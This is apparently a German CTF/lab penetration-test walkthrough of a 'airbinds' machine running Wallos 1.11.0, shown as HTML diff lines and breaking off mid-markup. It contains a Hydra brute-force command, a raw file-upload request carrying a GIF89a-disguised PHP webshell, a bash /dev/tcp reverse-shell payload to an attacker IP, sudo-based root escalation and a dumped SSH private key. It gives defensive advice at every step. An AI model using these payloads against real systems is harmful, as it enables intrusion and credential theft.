+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sofort mit den gefundenen Anmeldedaten (`admin:admin`) im Webinterface (`http://airbinds.hmv/login.php`) anmelden und nach Schwachstellen suchen, insbesondere nach Dateiupload-Funktionen, Code-Ausführungsmöglichkeiten oder Möglichkeiten zur Eskalation.<br><strong>Empfehlung (Admin):</strong> Niemals Standardpasswörter oder sehr schwache Passwörter wie `admin` verwenden! Starke, einzigartige Passwörter für alle Konten erzwingen. Account-Lockout-Mechanismen und Captchas implementieren, um Brute-Force-Angriffe auf Web-Logins zu erschweren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">hydra -l admin -P /usr/share/wordlists/rockyou.txt airbinds.hmv http-post-form "/login.php:username=^USER^&password=^PASS^:Login details are incorrect."</span></div>
+                    <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-07 23:10:29
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344481 login tries (l:1/p:14344481), ~896531 tries per task
+[DATA] attacking http-post-form://airbinds.hmv:80/login.php:username=^USER^&password=^PASS^:Login details are incorrect.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<span class="password">[80][http-post-form] host: airbinds.hmv   login: admin   password: admin</span>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<span class="password">1 of 1 target successfully completed, 1 valid password found</span>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-07 23:10:41
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Pentester meldet sich mit `admin:admin` erfolgreich im Webinterface an und navigiert zur "About"-Seite (`/about.php`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die About-Seite bestätigt die verwendete Software und Version: `Wallos v1.11.0`. Diese Information ist entscheidend für die weitere Schwachstellensuche.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Version `Wallos v1.11.0` sofort mit Tools wie `searchsploit` oder Online-Datenbanken (CVE Details, Exploit-DB) auf bekannte Schwachstellen überprüfen.<br><strong>Empfehlung (Admin):</strong> Software (CMS, Plugins etc.) immer aktuell halten, um bekannte Schwachstellen zu vermeiden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies Webseiten-Info ist -->
+                    <pre>
+login erfolgreich
+
+http://airbinds.hmv/about.php
+
+Informationen und Danksagungen
+
+<span class="command">Wallos v1.11.0</span>
+
+Lizenz: GPLv3
+
+Issues und Anfragen: GitHub
+
+Der Autor: https://henrique.pt
+
+Icons: https://www.streamlinehq.com/freebies/plump-flat-free
+
+Zahlungsweisen Icons: https://www.figma.com/file/5IMW8JfoXfB5GRlPNdTyeg/Credit-Cards-and-Payment-Methods-Icons-(Community)
+
+Chart.js: https://www.chartjs.org/
+</pre>
+                 </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> `searchsploit`, ein Kommandozeilen-Tool zur Suche in der lokalen Exploit-DB-Datenbank, wird verwendet, um nach Exploits für "wallos" zu suchen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Volltreffer! `searchsploit` findet einen Eintrag für `Wallos < 1.11.2 - File Upload RCE` (Remote Code Execution) mit dem Pfad `php/webapps/51924.txt`. Da die installierte Version 1.11.0 ist, ist die Anwendung anfällig für diese Schwachstelle.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Exploit-Code oder die Beschreibung aus `php/webapps/51924.txt` (oder direkt von Exploit-DB) holen und anwenden. Die Schwachstelle ermöglicht wahrscheinlich das Hochladen einer Webshell trotz Dateifiltern.<br><strong>Empfehlung (Admin):</strong> Wallos dringend auf Version 1.11.2 oder höher aktualisieren, um die RCE-Schwachstelle zu schließen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">searchsploit wallos</span></div>
+                      <pre>
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+<span class="password">Wallos < 1.11.2 - File Upload RCE                           | php/webapps/51924.txt</span>
+------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt zeigt einen mit Burp Suite abgefangenen oder konstruierten HTTP-POST-Request, der versucht, die gefundene RCE-Schwachstelle auszunutzen.
+                *   Ziel: `/endpoints/subscription/add.php` (ein Endpunkt zum Hinzufügen von Abonnements).
+                *   `Content-Type: multipart/form-data`: Zeigt einen Dateiupload an.
+                *   Parameter `name`: `benhacker`.
+                *   Parameter `logo`: Hier wird die Schwachstelle ausgenutzt.
+                    *   `filename="revshell.php"`: Der gewünschte Dateiname.
+                    *   `Content-Type: image/jpeg`: Täuscht einen erlaubten Bild-Dateityp vor.
+                    *   Der Dateiinhalt beginnt mit `GIF89a` (Magic Bytes für GIF), um einfache Inhaltsprüfungen zu umgehen, enthält dann aber PHP-Code (`<?php system($GET['cmd']); ?>` - aus dem Originaltext rekonstruiert, da unvollständig). Der Rest ist nicht sichtbar.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klassischer Versuch, einen Dateiupload-Filter zu umgehen, indem Metadaten (Dateiname, Content-Type) manipuliert und Magic Bytes vor den eigentlichen Schadcode gestellt werden. Der Exploit für CVE-2018-19422 in Wallos nutzt wahrscheinlich genau diese Technik.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Request absenden und die Server-Antwort sowie das Dateisystem (im erwarteten Upload-Verzeichnis) überprüfen, um zu sehen, ob die Shell erfolgreich hochgeladen wurde und unter welchem Namen sie gespeichert wurde.<br><strong>Empfehlung (Admin):</strong> Dateiuploads serverseitig robust validieren: Nicht nur Endung und Content-Type prüfen, sondern auch Magic Bytes und den tatsächlichen Inhalt analysieren (z.B. Bilder neu kodieren). Die Anwendung patchen (Wallos >= 1.11.2).</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies ein HTTP Request ist -->
+                      <pre>
+POST /endpoints/subscription/add.php HTTP/1.1
+Host: airbinds.hmv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Referer: http://airbinds.hmv/
+Content-Type: multipart/form-data; boundary=---------------------------88534912824449446283484888002
+Content-Length: 7251
+Origin: http://airbinds.hmv
+DNT: 1
+Connection: keep-alive
+Cookie: theme=light; PHPSESSID=f1o3u68q5j2g20bfqus5485iul; language=de; theme=light
+X-Forwarded-For: 217.14.168.39
+Sec-GPC: 1
+
+
+-----------------------------88534912824449446283484888002
+Content-Disposition: form-data; name="name"
+
+
+benhacker
+-----------------------------88534912824449446283484888002
+Content-Disposition: form-data; name="logo"; <span class="command">filename="revshell.php"</span>
+<span class="command">Content-Type: image/jpeg</span>
+
+
+<span class="command">GIF89a</span>
+
+
+<?php
+system($GET['cmd']); // Annahme basierend auf vorherigen Shells
+?>
+
+GIF89a
+
+
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Die HTTP-Antwort des Servers auf den Upload-Versuch.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Antwort ist ein `HTTP/1.1 200 OK` mit der JSON-Nachricht `{"status":"Success","message":"Abonnement erfolgreich hinzugef\u00fcgt"}`. Dies deutet darauf hin, dass die Anwendung den Upload akzeptiert hat, ohne die Umgehungstechnik zu erkennen!</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erfolg! Nun muss der Speicherort der hochgeladenen Datei gefunden werden. Basierend auf dem `startup.sh`-Skript und üblichen Pfaden ist `/var/www/html/images/uploads/logos/` ein wahrscheinlicher Kandidat. Den Namen der Datei herausfinden (oft wird er vom Server geändert).<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung: Patching und robuste Upload-Validierung sind dringend erforderlich.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da dies eine HTTP Response ist -->
+                    <pre>
+HTTP/1.1 200 OK
+Date: Wed, 07 Aug 2024 21:34:38 GMT
+Server: Apache/2.4.57 (Ubuntu)
+Set-Cookie: theme=light; expires=Fri, 06 Sep 2024 21:34:38 GMT; Max-Age=2592000
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 72
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: application/json
+
+<span class="password">{"status":"Success","message":"Abonnement erfolgreich hinzugef\u00fcgt"}</span>
+</pre>
+                </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Pentester durchsucht das vermutete Upload-Verzeichnis `/images/uploads/logos/` über den Browser.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verzeichnisauflistung ist auch hier aktiv und bestätigt den Fund! Eine Datei namens `1723066478-benhacker.php` wurde gefunden. Der Name besteht aus einem Zeitstempel (`1723066478`), dem im Formular angegebenen Namen (`benhacker`) und der ursprünglichen Endung `.php`. Die Anwendung hat die Endung nicht geändert, was die Ausführung der Shell ermöglicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell ist hochgeladen und der Pfad bekannt. Einen Listener starten (`nc -lvnp ...`) und dann die Shell über den Browser aufrufen (`http://airbinds.hmv/images/uploads/logos/1723066478-benhacker.php?cmd=...`), um eine Reverse Shell zu erhalten oder Befehle auszuführen.<br><strong>Empfehlung (Admin):</strong> Verzeichnisauflistung deaktivieren. Hochgeladene Dateien immer umbenennen und die Endung kontrollieren/ändern. Ausführung von Skripten in Upload-Verzeichnissen verhindern.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da dies Browser-Ausgabe/Verzeichnisinhalt ist -->
+                    <pre>
+browse http://airbinds.hmv/images/uploads/logos/
+===========================================================================
+
+Index of /images/uploads/logos
+===========================================================================
+[ICO]	Name	                         Last modified    	Size	 
+===========================================================================
+[]	<span class="command">1723066478-benhacker.php</span>	2024-08-07 21:34 	5.4K	
+
+=========================================================================== 
+Apache/2.4.57 (Ubuntu) Server at airbinds.hmv Port 80
+</pre>
+                 </div>
+            </div>
+
+            <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein `netcat`-Listener wird auf Port 9001 gestartet. Anschließend wird die URL der hochgeladenen Shell im Browser aufgerufen (impliziert durch die URL-Angabe). Später wird eine andere Shell-Datei (`1723067040-deni.php`) mit dem Parameter `?cmd=id` aufgerufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Aufruf von `?cmd=id` bei der `.php`-Datei führt zur Ausgabe `GIF89a; uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Das `GIF89a;` sind die Magic Bytes, die zur Umgehung des Filters verwendet wurden. Die nachfolgende `uid=...`-Ausgabe bestätigt, dass der `system()`-Befehl in der PHP-Shell erfolgreich als Benutzer `www-data` ausgeführt wurde! Der erste Listener (`nc -lvnp 9001`) hat hier noch keine Verbindung erhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Code-Ausführung ist bestätigt. Nun den Befehl für eine Reverse Shell senden. Der nächste Schritt zeigt dies.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zu Patching und Upload-Sicherheit.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+</pre>
+                  </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies eine URL ist -->
+                     <pre>
+<span class="command">http://airbinds.hmv/images/uploads/logos/1723066478-benhacker.php</span> 
+</pre> <!-- Vermutlich Aufruf ohne Parameter, keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies eine URL + Ausgabe ist -->
+                     <pre>
+<span class="command">http://airbinds.hmv/images/uploads/logos/1723067040-deni.php?cmd=id</span>
+
+<span class="password">GIF89a; uid=33(www-data) gid=33(www-data) groups=33(www-data)</span> 
+</pre>
+                 </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Webshell wird erneut aufgerufen, diesmal mit einem URL-kodierten Bash-Reverse-Shell-Payload als `cmd`-Parameter: `%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F9001%200%3E%261%27`. Parallel dazu wird auf dem Angreifer-System erneut ein `nc`-Listener auf Port 9001 gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Listener auf dem Angreifer-System meldet `connect to [192.168.2.199] from (UNKNOWN) [192.168.2.106] 55760`. Der Angreifer hat nun eine interaktive Shell auf dem Zielsystem als Benutzer `www-data`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Initial Access erfolgreich! Die Shell stabilisieren (Python PTY, stty raw -echo etc.). Mit der Enumeration für die Privilegieneskalation beginnen.<br><strong>Empfehlung (Admin):</strong> Egress Filtering implementieren, um ausgehende Reverse-Shell-Verbindungen zu blockieren/melden. IDS/IPS zur Erkennung von Shell-Payloads einsetzen. Grundursache (RCE-Schwachstelle) beheben.</p>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies eine URL ist -->
+                     <pre>
+<span class="command">http://airbinds.hmv/images/uploads/logos/1723067040-deni.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F9001%200%3E%261%27</span>
+</pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.106] 55760</span>
+bash: cannot set terminal process group (210): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt" style="color: yellow;">www-data@ubuntu:/var/www/html/images/uploads/logos$</span> 
+</pre>
+                  </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> In der erhaltenen Reverse Shell werden die Benutzeridentität und die `sudo`-Berechtigungen überprüft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                *   `id` bestätigt, dass die Shell als `www-data` läuft.
+                *   `sudo -l` liefert einen kritischen Fund: `User www-data may run the following commands on ubuntu: (ALL) NOPASSWD: ALL`. Das bedeutet, der Benutzer `www-data` kann jeden beliebigen Befehl (`ALL`) als jeder beliebige Benutzer (`ALL`, standardmäßig root) ohne Passwortabfrage (`NOPASSWD`) ausführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist der einfachste Weg zur Root-Eskalation! Einfach `sudo su` oder `sudo /bin/bash` ausführen, um eine Root-Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Absolute Katastrophe! Die Regel `(ALL) NOPASSWD: ALL` für einen Dienstbenutzer wie `www-data` ist eine massive Sicherheitslücke und muss sofort entfernt werden. Sudo-Berechtigungen sollten immer dem Prinzip der geringsten Rechte folgen: Nur spezifische, notwendige Befehle erlauben und `NOPASSWD` nur verwenden, wenn es absolut unumgänglich und der Befehl ungefährlich ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@ubuntu:/var/www/html/images/uploads/logos$ <span class="command">id</span></div>
+                    <pre>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@ubuntu:/var/www/html/images/uploads/logos$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User www-data may run the following commands on ubuntu:
+    <span class="password">(ALL) NOPASSWD: ALL</span>
+</pre>
+                 </div>
+            </div>
+
+            <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Pentester nutzt die gefundene `sudo`-Regel, um Root-Rechte zu erlangen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                *   `sudo su`: Wechselt den Benutzer zu `root`, ohne Passwortabfrage, da `NOPASSWD: ALL` gesetzt ist.
+                *   `id`: Bestätigt, dass der Benutzer nun `root` ist (`uid=0(root)`).
+                *   `find / -name *.txt 2>/dev/null`: Sucht nach `.txt`-Dateien im gesamten Dateisystem. Es wird `/root/user.txt` gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff erfolgreich! Die Datei `/root/user.txt` auslesen. Auch nach `root.txt` suchen (wahrscheinlich ebenfalls in `/root/`). System weiter untersuchen.<br><strong>Empfehlung (Admin):</strong> Die unsichere `sudo`-Regel entfernen!</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@ubuntu:/var/www/html/images/uploads/logos$ <span class="command">sudo su</span></div>
+                    <!-- Kein Ausgabe direkt, aber der Prompt ändert sich -->
+                     <pre>
+<span class="prompt">root@ubuntu:/var/www/html/images/uploads/logos#</span> 
+</pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@ubuntu:/var/www/html/images/uploads/logos# <span class="command">id</span></div>
+                    <pre>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+</pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@ubuntu:/home/ubuntu# <span class="command">find / -name *.txt 2>/dev/null</span></div>
+                     <pre>
+<span class="command">/root/user.txt</span>
+</pre>
+                 </div>
+            </div>
+        </section>
+
+        <section id="lateral-movement">
+             <h2>Lateral Movement (IPv6)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `root` wird der Inhalt des privaten SSH-Schlüssels (`id_rsa`) aus dem Verzeichnis `/root/.ssh` angezeigt. Dieser Schlüssel gehört wahrscheinlich dem Root-Benutzer auf diesem Ubuntu-System.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es wurde ein privater SSH-Schlüssel für den Root-Benutzer gefunden. Dieser könnte potenziell verwendet werden, um sich ohne Passwort auf anderen Systemen anzumelden, falls der zugehörige öffentliche Schlüssel dort in der `authorized_keys`-Datei eingetragen ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den privaten Schlüssel kopieren und sicher speichern. Prüfen, ob er mit einer Passphrase geschützt ist (sieht auf den ersten Blick nicht so aus). Versuchen, sich mit diesem Schlüssel auf anderen potenziellen Zielen im Netzwerk (insbesondere, wenn sie über IPv6 erreichbar sind, siehe nächste Schritte) als `root` anzumelden.<br><strong>Empfehlung (Admin):</strong> Private SSH-Schlüssel von Root sollten besonders geschützt und idealerweise nicht für die passwortlose Anmeldung verwendet werden. Wenn nötig, mit starken Passphrasen schützen und Zugriff auf die Schlüsseldatei limitieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@ubuntu:~/.ssh# <span class="command">cat id_rsa</span></div>
+                    <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+EkGwPez9XGBEUAAAALcm9vdEB1YnVudHU=
+-----END OPENSSH PRIVATE KEY-----
+</pre>
+                 </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> `netstat -net` wird auf dem Ubuntu-System (wo wir Root sind) ausgeführt, um aktive TCP-Netzwerkverbindungen anzuzeigen (`-e` für etablierte, `-t` für TCP, `-n` für numerisch).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt zwei etablierte Verbindungen:
+                *   Die Reverse Shell (`10.0.3.241:55760` -> `192.168.2.199:9001`). Die lokale IP `10.0.3.241` ist interessant, sie deutet auf ein internes Netzwerk hin (möglicherweise LXC/Docker-Bridge).
+                *   Eine Verbindung von Port 80 (`10.0.3.241:80`) zu unserem Angreifer-System (`192.168.2.199:40254`). Dies ist wahrscheinlich die Verbindung, die durch den Aufruf der Webshell im Browser entstanden ist.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die interne IP `10.0.3.241` notieren. Es scheint, als ob das Ubuntu-System in einem Container oder einer VM mit einem eigenen Subnetz (`10.0.3.0/24`) läuft. Dies könnte für Lateral Movement relevant sein.<br><strong>Empfehlung (Admin):</strong> Netzwerkverbindungen überwachen. Interne Netzwerkstrukturen (wie Docker/LXC-Netzwerke) sollten dokumentiert und gesichert sein.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@ubuntu:~/.ssh# <span class="command">netstat -net</span></div>
+                     <pre>
+Active Internet connections (w/o servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode     
+tcp        0      0 <span class="command">10.0.3.241:55760</span>        <span class="command">192.168.2.199:9001</span>      ESTABLISHED 33         136584    
+tcp6       0      0 <span class="command">10.0.3.241:80</span>           <span class="command">192.168.2.199:40254</span>     ESTABLISHED 33         135272 
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird `ping6` verwendet, um IPv6-Hosts im lokalen Netzwerk zu entdecken.
+                *   `-I eth0`: Gibt das Interface an, über das gesendet wird.
+                *   `ff01::1`: Node-local all-nodes Multicast-Adresse. Sendet an alle IPv6-Knoten auf dem lokalen Interface.
+                *   `-c 3`: Sendet 3 Pakete.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Ping an `ff01::1` erhält nur Antworten von der eigenen Link-Local-Adresse (`fe80::a00:27ff:fe30:2eda%eth0`). Dies ist nicht sehr nützlich zur Entdeckung anderer Hosts.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Statt `ff01::1` die Adresse `ff02::1` (Link-local all-nodes) verwenden, um alle Hosts im lokalen Netzwerksegment zu erreichen.<br><strong>Empfehlung (Admin):</strong> ICMPv6 (insbesondere Neighbor Discovery) ist für IPv6 essentiell und sollte nicht blockiert werden, aber Monitoring kann sinnvoll sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/home/ccat/Downloads]<br>└─# <span class="command">ping6 -I eth0 ff01::1 -c 3</span></div>
+                    <pre>
+PING ff01::1 (ff01::1) from fe80::a00:27ff:fe30:2eda%eth0 eth0: 56 data bytes
+64 bytes from <span class="command">fe80::a00:27ff:fe30:2eda%eth0</span>: icmp_seq=1 ttl=64 time=0.022 ms
+64 bytes from <span class="command">fe80::a00:27ff:fe30:2eda%eth0</span>: icmp_seq=2 ttl=64 time=0.035 ms
+64 bytes from <span class="command">fe80::a00:27ff:fe30:2eda%eth0</span>: icmp_seq=3 ttl=64 time=0.033 ms
+
+--- ff01::1 ping statistics ---
+</pre>
+                 </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Ubuntu-System (als Root) wird die Routing-Tabelle angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Routing-Tabelle zeigt:
+                *   Ein Default-Gateway `10.0.3.1` über das Interface `eth0`.
+                *   Das lokale Subnetz `10.0.3.0/24` ist direkt über `eth0` erreichbar.
+            Dies bestätigt, dass das Ubuntu-System in einem internen `10.0.3.0/24`-Netzwerk läuft und `10.0.3.1` das Gateway zu anderen Netzen ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Gateway `10.0.3.1` und das Subnetz `10.0.3.0/24` als potenzielle Ziele für weiteres Lateral Movement untersuchen. Gibt es andere Hosts in diesem Netz? Läuft etwas Interessantes auf dem Gateway?<br><strong>Empfehlung (Admin):</strong> Interne Netzwerke segmentieren und Firewalls zwischen Segmenten implementieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
